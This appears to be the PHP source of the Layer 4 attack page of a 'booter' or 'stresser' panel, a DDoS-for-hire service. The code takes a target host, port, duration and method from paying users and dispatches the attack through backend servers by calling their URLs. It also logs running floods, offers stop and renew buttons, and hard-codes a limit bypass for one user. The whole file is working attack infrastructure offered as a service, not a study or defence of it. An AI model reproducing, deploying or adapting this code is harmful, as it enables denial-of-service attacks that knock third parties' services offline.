<?php
ob_start();
require_once 'includes/db.php';
require_once 'includes/init.php';
error_reporting(0);
//ini_set("display_errors", "on");
if (!($user -> LoggedIn()))
{
	header('location: login.php');
	die();
	

	
	header('location: purchase.php');
	die();
}
if (!($user -> notBanned($odb)))
{
	header('location: login.php');
	die();
}
$plansql = $odb -> prepare("SELECT `users`.*,`plans`.`name`, `plans`.`mbt`,`plans`.`max_boots` AS `pboots` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id LIMIT 1");
$plansql -> execute(array(":id" => $_SESSION['ID']));
$userInfo = $plansql -> fetch(PDO::FETCH_ASSOC);	
$attackResult = null;

$currentPage = "Hub l4";
$pageon = "Hub L4";


if (isset($_POST['attackBtn']))
{
	if ($stats->runningBoots($odb) < $maxBootSlots) {
		if ( !(isset($_POST['host'], $_POST['port'], $_POST['time'], $_POST['method']) &&
				!empty($_POST['host']) &&
				!empty($_POST['port']) &&
				!empty($_POST['time']) &&
				!empty($_POST['method'])
			))
		{
			$attackResult =  '<div class="g_12"><div class="alert alert-danger">ERROR: Please Fill In All Fields</div></div>';
		}
		else
		{
			$host = $_POST['host'];
			$port = intval($_POST['port']);
			$time = intval($_POST['time']);
			$method = $_POST['method'];
			if (!filter_var($host, FILTER_VALIDATE_IP) && !filter_var($host, FILTER_VALIDATE_URL))
			{
				$attackResult =  '<div class="g_12"><div class="alert alert-danger">Invalid Host</div></div>';
			}
			else
			{
				$h = preg_replace("/(https?:\/\/)/is", "", $host);
				$h = trim($h);
				$h = rtrim($h, "/");
				$SQLCheckBlacklist = $odb -> prepare("SELECT COUNT(*) FROM `blacklist` WHERE `IP` = :host");
				$SQLCheckBlacklist -> execute(array(':host' => $h));
				$countBlacklist = $SQLCheckBlacklist -> fetchColumn(0);
				if ($countBlacklist > 0)
				{
					$attackResult =  '<div class="g_12"><div class="alert alert-danger">IP is blacklisted</div></div>';
				}
				else
				{
					$bootRunning = $odb->prepare("SELECT * FROM `logs` WHERE `ip`=:host AND `stopped` = 'No' AND `time`+`date` > UNIX_TIMESTAMP(NOW()) ORDER BY `ID` DESC LIMIT 1;");
					$bootRunning->execute(array(":host" => $host));
					if ($bootRunning->rowCount() == 0) {
						$SQLGetTime = $odb -> prepare("
							SELECT `plans`.`mbt`,
									`plans`.`allowed_methods`,
									`plans`.`max_boots` AS `planBoots`,
									`users`.`max_boots` AS `userBoots`
							FROM `plans`
							LEFT JOIN `users`
							ON `users`.`membership` = `plans`.`ID`
							WHERE `users`.`ID` = :id
						");
						$SQLGetTime -> execute(array(':id' => $_SESSION['ID']));
						
						$maxBoots = 0;
						if ($SQLGetTime->rowCount() != 0) {
							$row = $SQLGetTime->fetch(PDO::FETCH_ASSOC);
							$maxBoots = $row['planBoots'] + $row['userBoots'];
						}
					
						$checkRunningSQL = $odb -> prepare("SELECT `user`,`time` FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP()");
						$checkRunningSQL -> execute(array(':username' => $_SESSION['username']));
						if ($checkRunningSQL->rowCount() < $maxBoots || $_SESSION['username'] == "Sceptical") // fuck da police!
						{
							$displayCountdown = false;
						
							$fetchLastBoot = $odb->prepare("SELECT `user`,`date` FROM `logs` WHERE `user` = :username ORDER BY `date` DESC LIMIT 1;");
							$fetchLastBoot->execute(array(":username"=>$_SESSION['username']));
							if ($fetchLastBoot->rowCount() != 0) {
								$lastBoot = $fetchLastBoot->fetch(PDO::FETCH_ASSOC);
								$bootSeconds = ($maxBootCooldown - (time()-$lastBoot['date']));
								if ((time()-$lastBoot['date']) <= $maxBootCooldown) {
									$displayCountdown = true;
								}
							}
							
							
							if ($SQLGetTime->rowCount() != 0) {
								
								$maxTime = $row['mbt'];

								// temp shit code
								$allowedMethod = false;
								
								$methods = $user->fetchAllowedMethods();
								if ($methods !== null) {
									foreach ($methods as $m) {
										if ($m['method'] === $method) {
											$allowedMethod = true;
											break;
										}
									}
								}

								
								if ($allowedMethod) {
									if (!($time > $maxTime) && $displayCountdown !== true)
									{
										$servers = array();
										$name = "*";
										
										if ($useRotations) {
											$getServers = $odb->query("SELECT * FROM `servers_layer4` WHERE `active`='1' ORDER BY ABS(`last_used`) ASC LIMIT 1;");
											if ($getServers->rowCount() != 0) {
												$servers = $getServers->fetchAll(PDO::FETCH_ASSOC);
												$name = $servers[0]['name'];
											}
										} else {
											$getServers = $odb->query("SELECT * FROM `servers_layer4` WHERE `active`='1' ORDER BY ABS(`last_used`) ASC;");
											if ($getServers->rowCount() != 0) $servers = $getServers->fetchAll(PDO::FETCH_ASSOC);										
										}
										
										if (!empty($servers)) {
											
											$addr = "";
											
											foreach ($servers as $k => $server)
											{
												$addr = str_replace("%host%", $host, $server['addr'] . $server['resource']);
												$addr = str_replace("%time%", $time, $addr);
												$addr = str_replace("%port%", $port, $addr);
												$addr = str_replace("%method%", $method, $addr);
												
												@file_get_contents($addr);
												
												$addr = null;
												$updateServer = $odb->prepare("UPDATE `servers_layer4` SET `last_used` = UNIX_TIMESTAMP(NOW()) WHERE `id`=:id");
												$updateServer->execute(array(":id" => $server['id']));
											}
											
											
											$insertLogSQL = $odb -> prepare("INSERT INTO `logs` VALUES(:user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), NULL, :stopped, :server)");
											$insertLogSQL -> execute(array(':user' => $_SESSION['username'], ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':stopped' => "No", ":server" => $name));
											
										
												
												$attackId = $odb->lastInsertId();
												$token = md5(uniqid() . "@" . microtime(true) . "AppleJuice:" . $_SESSION['ID']); // overkill, but it'll do ;)
												
												$createPingToken = $odb->prepare("INSERT INTO `ping_tokens` (`token`,`user_id`,`attack_id`,`date`) VALUES (:token, :uid, :aid, UNIX_TIMESTAMP(NOW()))");
												$createPingToken->execute(array(
													":token" => $token,
													":uid"   => $_SESSION['ID'],
													":aid"   => $attackId,
												));
										
											
											$attackResult = "
		<script type='text/javascript'>
			jQuery(function (){
				$('.countdown2').countdown({
					until : " . ($time+$maxBootCooldown) . ",
					layout : \" in {mn} {ml} and {sn} {sl}\",
					onExpiry : function () {
						$(\".countdown2\").html(\"\");
						window.setTimeout(function (){
						//	window.location.href = location.href;
						}, 2500);
					}
				});
			});
		</script>
		<div class=\"g_12\"><div class=\"alert alert-success\">SUCCESS: Attack has been sent to " . $host.":".$port . " for " . $time . " seconds using " . $method . " which will be handled by " . $name . " . You can send another attack<span class=\"countdown2\"></span></div></div>";
										} else {
											$attackResult = "<div class='alert alert-danger'>There are currently no servers available! Please try again in a few minutes.</div>";
										}
									}
									else
									{
		$attackResult =  "
	<script type=\"text/javascript\">
		jQuery(function (){
			$(\".countdown\").countdown({
				until : " . $bootSeconds . ",
				layout : \" in {mn} {ml} and {sn} {sl}\",
				onExpiry : function () {
				$(\".countdown\").html(\"\");
					window.setTimeout(function (){
						window.location.href = location.href;
					}, 2500);
				}
			});
		});
	</script>
	<div class=\"g_12\"><div class=\"alert alert-danger\">ERROR: Your max boot time is " . $maxTime . ", with a cooldown of " . $maxBootCooldown . " seconds. You can send another attack in <span class=\"countdown\"></span></div></div>";
									}
								} else 
								{
									$attackResult =  "<div class='g_12'><div class='alert alert-danger'>Failed to send attack, you are not authorized to send <strong>" . $method . "</strong> type attacks</div></div>";
								}
							} else 
							{
								$attackResult =  "<div class='g_12'><div class='alert alert-danger'>An unexpected error has occured, your membership</div></div>";
							}
						} 
						else
						{
							$log = $checkRunningSQL->fetch(PDO::FETCH_ASSOC);
	$attackResult = "
	<script type=\"text/javascript\">
		jQuery(function (){
			$(\".countdown\").countdown({
				until : " . ($log['time']+$maxBootCooldown) . ",
				layout : \" {mn} {ml} and {sn} {sl}\",
				onExpiry : function () {
					$(\".atack-notice\").html(\"The attack has completed.\");
				}
			});
		});
	</script>
	<div class=\"g_12\"><div class=\"alert alert-danger\">ERROR: You currently have a boot running. <span class='attack-count'>Please wait <span class=\"countdown\"></span> for the attack to finish.</span></div></div>";
						}
					} else {
						$log = $bootRunning->fetch(PDO::FETCH_ASSOC);
	$attackResult = "
	<script type=\"text/javascript\">
		jQuery(function (){
			$(\".countdown\").countdown({
				until : " . ($log['time']+$maxBootCooldown) . ",
				layout : \" {mn} {ml} and {sn} {sl}\",
				onExpiry : function () {
					$(\".atack-notice\").html(\"The attack has completed.\");
				}
			});
		});
	</script>
	<div class=\"g_12\"><div class=\"alert alert-danger\">ERROR: An attack to this host: " . $host . " is already present. <span class='attack-count'>Please wait <span class=\"countdown\"></span> for the attack to finish.</span></div></div>";
						
					}
				}
			}
		}
	} else {
		$attackResult =  '<div class="g_12"><div class="alert alert-danger">ERROR: Maximum amount of boot slots taken</div></div>';
	}
}								
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title><?php echo $bootername; ?><?php echo $pageon ?></title>
	
	<link rel="icon" sizes="192x192" href="img/touch-icon.png" /> 
	<link rel="apple-touch-icon" href="img/touch-icon-iphone.png" /> 
	<link rel="apple-touch-icon" sizes="76x76" href="img/touch-icon-ipad.png" /> 
	<link rel="apple-touch-icon" sizes="120x120" href="img/touch-icon-iphone-retina.png" />
	<link rel="apple-touch-icon" sizes="152x152" href="img/touch-icon-ipad-retina.png" />
	
	<link rel="shortcut icon" type="image/x-icon" href="img/web-hosting.ico" />

	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="css/main.min.css">
	
	<script type="text/javascript" src="js/main.js"></script>
</head>
<body>


	<div class="wrapper">

		<aside class="sidebar">

		<?php include "includes/template/sidebar.php"; ?>
		
		</aside> <!-- /sidebar -->
		
		<section class="content">
			<header class="main-header">
				<div class="main-header__nav">
					<h1 class="main-header__title">
						<i class="pe-7f-edit"></i>
						<span><?php echo $pageon ?></span>
					</h1>
					<ul class="main-header__breadcrumb">
						<li><a href="#" onclick="return false;"><?php include 'includes/name.php'; ?></a></li>
						<li><a href="#" onclick="return false;"><?php echo $pageon ?></a></li>
						
					</ul>
				</div>
				
				<div class="main-header__date">
					<input type="radio" id="radio_date_1" name="tab-radio" value="today" checked><!--
					--><input type="radio" id="radio_date_2" name="tab-radio" value="yesterday"><!--
					--><button>
						<i class="pe-7f-date"></i>
						<span>Expire: <?php echo date('d-m-Y' ,$userInfo['expire']); ?></span>
					</button>
				</div>
			</header> 
				<!-- /main-header -->
<!-- /row -->
		<?php
if (isset($_POST['stopBtn']))
				{
					$stopbtnID = $_POST['rowID'];
					$checkIP = $odb -> prepare("SELECT * FROM `logs` WHERE user=:username AND `time` + `date` > UNIX_TIMESTAMP(NOW()) AND `ID` = :id");
					$checkIP -> execute(array(':username'=>$_SESSION['username'], ':id' => $stopbtnID));
					$row = $checkIP->fetch(PDO::FETCH_ASSOC);
					$host = $row['ip'];
					$server = $row['server_used'];
					ini_set('default_socket_timeout', 5);

							if (isset($row['stopped']) && $row['stopped'] == "No") {
								$servers = array();
								$name = "*";
								
								if ($server != "*") {
									$getServers = $odb->prepare("SELECT * FROM `servers_layer4` WHERE `name`=:name LIMIT 1;");
									$getServers->execute(array(":name" => $server));
									if ($getServers->rowCount() != 0) {
										$servers = $getServers->fetchAll(PDO::FETCH_ASSOC);
										$name = $servers[0]['name'];
									}
								}
								if ($server == "*" || empty($servers)) {
									$getServers = $odb->query("SELECT * FROM `servers_layer4` ORDER BY ABS(`last_used`) ASC;");
									if ($getServers->rowCount() != 0) $servers = $getServers->fetchAll(PDO::FETCH_ASSOC);										
								}
								
								$addr = "";
								
								foreach ($servers as $k => $server)
								{
									$addr = str_replace("%host%", $host, $server['addr'] . $server['resource']);
									$addr = str_replace("%time%", 1, $addr);
									$addr = str_replace("%port%", 1, $addr);
									$addr = str_replace("%method%", "stop", $addr);
									@file_get_contents($addr);
									
									$addr = null;
								}
							}

								$updateSQL = $odb -> prepare("UPDATE `logs` SET `stopped` = :stopped , `date` = `date` - `time` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `ID` = :id");
								$updateSQL -> execute(array(':username' => $_SESSION['username'], ':id' => $stopbtnID, ':stopped' => "Yes"));	
								echo '<div class="g_12"><div class="alert alert-success"> Attack has been stopped on the server </div></div>';										
									}

									
									echo (isset($attackResult) && !empty($attackResult) ? $attackResult : ""); ?>
				<div class="row">
					<div class="col-md-4">
 <form action="" method="POST">
						<article class="widget widget__form">
							<header class="widget__header">
								<div class="widget__title" style="width:100%;">
									<i class="pe-7s-menu"></i><h3>Stresser</h3>
								</div>
							</header>

							<div class="widget__content">
								<input name="host" type="text" placeholder="Hostname"/>
								<input name="port" type="text" placeholder="Port"/>
								<input name="time" maxlength="4" type="text" placeholder="Time"/>
								<select name="method" class="btn btn-block gray dropdown-toggle" style='color:#000;'>
<?php

$methods = $user->fetchAllowedMethods();
foreach ($methods as $method) {
	echo "<option value=\"" . $method['method'] . "\">" . $method['friendly_name'] . "</option>" . PHP_EOL;
}
?>

                                </select>
									
								<button type="submit" name="attackBtn">Stress!</button>
						</div>
								

						</form>
					</div>
					
<?php

if (isset($token)) {
?>



												


<?php
}

?>
					

					<div class="col-md-<?php echo (isset($token) ? "12" : "8"); ?>">
						<article class="widget">
							<header class="widget__header">
								<div class="widget__title" style="width:100%;">
									<i class="pe-7s-mouse"></i><h3>Attack Manager</h3>
								</div>
							</header>
							<div class="tab-radio-full">
								<input type="radio" id="tab_radio_1" name="tab-radio-2" value="tabr1" checked>
								<label for="tab_radio_1" class="btn-md"> <i class="pe-7f-science pe-spin"></i> Current Boots</label>
								<input type="radio" id="tab_radio_2" name="tab-radio-2" value="tabr2" >
							<label for="tab_radio_2" class="btn-md"> <i class="pe-7f-refresh pe-spin"></i> Previous boots</label>
							</div>
							<div class="widget__content table-responsive">
								
								<table class="table table-striped media-table">
									  	<thead>
									  		<tr>
									  			<th>ID</th>
									  			<th>Target</th>
									  			<th>Port</th>
									  			<th>Time</th>
									  			<th>Method</th>
									  			<th>Action</th>
									  		</tr>
									  	</thead>
									  	<tbody  data-tab-radio="tab-radio-2" class="tab-radio-content" id="tabr1">
									

									  	
									  		
									  		<?php
				  $SQLSelectRunningAttack = $odb -> prepare("SELECT * FROM `logs` WHERE user= :user AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 'No' ORDER BY `ID` DESC");
				  $SQLSelectRunningAttack->execute(array(":user" => $_SESSION['username']));
				  if ($SQLSelectRunningAttack->rowCount() != 0) {
				  while ($show = $SQLSelectRunningAttack -> fetch(PDO::FETCH_ASSOC))
				  {
					$ip = htmlentities($show['ip']);
					$port = htmlentities($show['port']);
					$time = htmlentities($show['time']);
					$method = htmlentities($show['method']);
					$rowID = htmlentities($show['ID']);
					echo '<tr class="spacer"></tr><tr><td>'.$rowID.'</td><td>'.$ip.'</td><td>'.$port.'</td><td>'.$time.'</td><td>'.$method.'</td><td><form method="post"><div class="g_10"><button type="submit" name="stopBtn" class="btn red inverse">Stop Flood</button><input type="hidden" name="rowID" value="'.$rowID.'" /></div></form></td></tr>'; 
				  } }
				  
				  else {
					echo "<tr class=\"spacer\"></tr><tr><td colspan='6'>You have no boots currently running</td></tr>";
				  }
				  ?>
				  
									</tbody>
									<tbody data-tab-radio="tab-radio-2" class="tab-radio-content" id="tabr2">
				  <?php
				  $SQLSelectRunningAttack = $odb -> prepare("SELECT * FROM `logs` WHERE user= :user AND (`time` + `date` < UNIX_TIMESTAMP() OR `stopped` != 'No') ORDER BY `ID` DESC LIMIT 10;");
				   $SQLSelectRunningAttack->execute(array(":user" => $_SESSION['username']));
				    if ($SQLSelectRunningAttack->rowCount() != 0) {
				  while ($show = $SQLSelectRunningAttack -> fetch(PDO::FETCH_ASSOC))
				  {
					$ip = htmlentities($show['ip']);
					$port = htmlentities($show['port']);
					$time = htmlentities($show['time']);
					$method = htmlentities($show['method']);
					$rowID = htmlentities($show['ID']);
					
					echo '<tr class="spacer"></tr><tr><td>'.$rowID.'</td><td>'.$ip.'</td><td>'.$port.'</td><td>'.$time.'</td><td>'.$method.'</td><td><form method="post" action="">
						<div class="g_10"><button type="submit" name="attackBtn" class="btn dark inverse">Renew</button>
								<input name="host" type="hidden" value="' . $ip . '"/>
								<input name="port" type="hidden" value="' . $port . '"/>
								<input name="time" type="hidden" value="' . $time . '"/>
								<input name="method" type="hidden" value="' . $method . '"/>
						</div></form></td></tr>
							'; 
				  } }
				  
				  else {
					echo "<tr class=\"spacer\"></tr><tr><td colspan='6'>You have no previous boots</td></tr>";
				  }
				 ?>
									  		
									  	

									  	</tbody>
										</table>
										




							</div>
						</article><!-- /widget --> 
					</div>
					
				</div>

		</section> <!-- /content -->

	</div>



	<script type="text/javascript" src="js/amcharts/amcharts.js"></script>
	<script type="text/javascript" src="js/amcharts/serial.js"></script>
	<script type="text/javascript" src="js/amcharts/pie.js"></script>
	<script type="text/javascript" src="js/chart.js"></script>
	
	<script type="text/javascript" src="js/countdown/jquery.plugin.js"></script>
	<script type="text/javascript" src="js/countdown/jquery.countdown.js"></script>
</body>
</html>